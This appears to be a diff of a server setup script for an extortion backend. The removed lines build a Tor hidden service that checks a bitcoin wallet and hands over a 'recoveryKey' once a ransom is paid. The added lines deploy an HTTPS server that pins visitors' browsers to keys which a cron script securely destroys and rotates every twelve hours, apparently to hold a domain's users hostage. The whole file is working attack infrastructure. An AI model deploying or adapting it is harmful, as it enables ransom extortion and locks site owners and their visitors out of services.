@@ -1,118 +1,182 @@
 #!/bin/bash
 
-dir="$(cd "$(dirname "$0")"; pwd)"
-cd /
+rootDomain="${1}"
+interval=43200
+
+dir="$(pwd)"
+cd $(cd "$(dirname "$0")"; pwd)
 
 sed -i 's/# deb /deb /g' /etc/apt/sources.list
 sed -i 's/\/\/.*archive.ubuntu.com/\/\/archive.ubuntu.com/g' /etc/apt/sources.list
 
 export DEBIAN_FRONTEND=noninteractive
-echo "deb http://deb.torproject.org/torproject.org $(lsb_release -c | awk '{print $2}') main" >> /etc/apt/sources.list
-gpg --keyserver keys.gnupg.net --recv 886DDD89
-gpg --export A3C4F0F979CAA22CDBA8F512EE8CBC9E886DDD89 | apt-key add -
 apt-get -y --force-yes update
 apt-get -y --force-yes upgrade
-apt-get -y --force-yes install deb.torproject.org-keyring tor nodejs-legacy npm
+apt-get -y --force-yes install curl
+curl -sL https://deb.nodesource.com/setup_6.x | bash -
+apt-get -y --force-yes update
+apt-get -y --force-yes install nodejs openssl build-essential
 
-npm install level request express body-parser
+su ubuntu -c 'cd ; npm install cors express level'
 
-echo '
-	HiddenServiceDir /var/lib/tor/hidden_service/
-	HiddenServicePort 80 127.0.0.1:8080
-' >> /etc/tor/torrc
+wget https://dl.eff.org/certbot-auto -O /opt/certbot
+chmod +x /opt/certbot
+/opt/certbot certonly -n --agree-tos
 
-mkdir /var/lib/tor/hidden_service/
-chown -R debian-tor:debian-tor /var/lib/tor/hidden_service/
-chmod -R 0700 /var/lib/tor/hidden_service/
-
-service tor stop
-killall tor
-service tor start
+mkdir /ssl
+echo 'tmpfs /ssl tmpfs rw,size=50M 0 0' >> /etc/fstab
+mount --all
 
 
-cat > /server.js << EndOfMessage
-#!/usr/bin/env node
+cat > /rekey.sh << EndOfMessage
+#!/bin/bash
 
-var db = require('level')('/ransoms');
+function delete {
+	if [ -f "\${1}" ] ; then
+		for i in {1..10} ; do
+			dd if=/dev/urandom of="\${1}" bs=1024 count="\$(du -k "\${1}" | cut -f1)"
+		done
 
-var request = require('request');
-
-var app = require('express')();
-app.use(require('body-parser').json());
-
-var failureMessage = 'fak u gooby';
-
-function getTargetFromRequest (req) {
-	return req.url.split('/').slice(-1)[0];
+		rm "\${1}"
+	fi
 }
 
-app.get('/*', function(req, res) {
-	var target = getTargetFromRequest(req);
+subdomains=''
+for i in {0..31} ; do
+	subdomains="\${subdomains} -d \${i}.${rootDomain}"
+done
 
-	db.get(target, function (_, val) {
-		try {
-			var o = JSON.parse(val);
-		}
-		catch (_) {
-			res.end(failureMessage);
-			return;
-		}
+delete /ssl/keybackup.pem
+openssl genrsa -out /ssl/keybackup.pem 2048
 
-		try {
-			request(
-				'https://blockchain.info/rawaddr/' + o.walletAddress + '?balance_unit=satoshi',
-				function (_, _, body) {
-					try {
-						var balance = JSON.parse(body).total_received * 0.00000001;
+kill \$(ps ux | grep /server.js | grep -v grep | awk '{print \$2}')
 
-						if (balance >= o.ransomAmount) {
-							res.end(o.recoveryKey);
-							return
-						}
-					}
-					catch (_) {}
+/opt/certbot certonly \
+	-n \
+	--agree-tos \
+	--register-unsafely-without-email \
+	--expand \
+	--standalone \
+	-d \$(date +%s).${rootDomain} \
+	\${subdomains}
 
-					res.end('');
-				}
-			);
-		}
-		catch (_) {
-			res.end('');
-		}
-	});
-});
+delete /ssl/key.pem
+delete /ssl/cert.pem
 
-app.post('/*', function(req, res) {
-	var target = getTargetFromRequest(req);
+find /etc/letsencrypt -type f -name cert1.pem -exec mv {} /ssl/cert.pem \;
+find /etc/letsencrypt -type f -name privkey1.pem -exec mv {} /ssl/key.pem \;
 
-	db.get(target, function (err) {
-		if (!err) {
-			res.end(failureMessage);
-			return;
-		}
+find /etc/letsencrypt -type f -exec delete {} \;
+rm -rf /etc/letsencrypt
 
-		db.put(target, JSON.stringify(req.body), function (err) {
-			res.end(
-				err ?
-					failureMessage :
-					'ransom setup complete'
-			);
-		});
-	});
-});
+chmod -R 777 /ssl /home/ubuntu/server.js
 
-app.listen(8080);
+su ubuntu -c 'cd ; rm -rf users ; ./server.js' &
+/opt/certbot certonly -n --agree-tos &
+sleep ${interval}
+/rekey.sh &
 EndOfMessage
 
 
-chmod 700 /server.js
+cat > /home/ubuntu/server.js << EndOfMessage
+#!/usr/bin/env node
+
+const app			= require('express')();
+const child_process	= require('child_process');
+const db			= require('level')('users');
+const fs			= require('fs');
+const https			= require('https');
+
+const certPath		= '/ssl/cert.pem';
+const keyPath		= '/ssl/key.pem';
+const keyBackupPath	= '/ssl/keybackup.pem';
+
+const errorMessage	= 'fak u gooby';
+
+const keyHashes		= [keyPath, keyBackupPath].map(path =>
+	child_process.spawnSync('openssl', [
+		'enc',
+		'-base64'
+	], {
+		input: child_process.spawnSync('openssl', [
+			'dgst',
+			'-sha256',
+			'-binary'
+		], {
+			input: child_process.spawnSync('openssl', [
+				'rsa',
+				'-in',
+				path,
+				'-outform',
+				'der',
+				'-pubout'
+			]).stdout
+		}).stdout
+	}).stdout.toString().trim()
+);
+
+const getIdFromRequest	= req =>
+	\`\${req.connection.remoteAddress}-\${req.get('host')}\`
+;
+
+app.use(require('cors')());
+
+app.get('/check', (req, res) =>
+	db.get(getIdFromRequest(req), (_, isSet) => {
+		if (isSet) {
+			res.status(418);
+			res.end(errorMessage);
+		}
+		else {
+			res.end('');
+		}
+	})
+);
+
+app.post('/set', (req, res) =>
+	db.put(getIdFromRequest(req), true, err => {
+		if (err) {
+			res.status(418);
+			res.end(errorMessage);
+		}
+		else {
+			res.set(
+				'Public-Key-Pins',
+				'max-age=31536000; ' +
+					'includeSubdomains; ' +
+					keyHashes.map(hash => \`pin-sha256="\${hash}"\`).join('; ')
+			);
+
+			res.end('');
+		}
+	})
+);
+
+https.createServer({
+	cert: fs.readFileSync(certPath),
+	key: fs.readFileSync(keyPath),
+	dhparam: child_process.spawnSync('openssl', [
+		'dhparam',
+		/(\d+) bit/.exec(
+			child_process.spawnSync('openssl', [
+				'rsa',
+				'-in',
+				keyPath,
+				'-text',
+				'-noout'
+			]).stdout.toString()
+		)[1]
+	]).stdout.toString()
+}, app).listen(31337);
+EndOfMessage
+
+
+chmod 700 /rekey.sh
 
 crontab -l > /tmp.cron
-echo '@reboot /server.js' >> /tmp.cron
+echo '@reboot /rekey.sh' >> /tmp.cron
 crontab /tmp.cron
 rm /tmp.cron
-
-cat /var/lib/tor/hidden_service/hostname
 
 cd "${dir}"
 rm backend.sh
